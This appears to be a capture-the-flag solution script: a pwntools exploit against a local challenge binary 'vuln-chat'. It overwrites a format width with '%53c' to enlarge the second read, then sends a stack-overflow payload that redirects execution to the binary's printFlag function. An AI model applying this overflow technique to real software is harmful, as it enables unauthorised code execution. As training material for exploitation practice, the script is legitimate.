#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln-chat
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln-chat')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    p = process([exe.path] + argv, *a, **kw)

    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

first_offset = 20
second_offset = 48
gen = cyclic_gen()

res = io.recvline()
payload = b""
payload += gen.get(first_offset)
payload += b"%53c"
io.sendline(payload)

for _ in range(4):
    io.recvline()

io.recvuntil(b":")

payload = b""
payload += gen.get(second_offset)
payload += p32(exe.sym.printFlag)
io.sendline(payload)

io.recvline()
io.interactive()

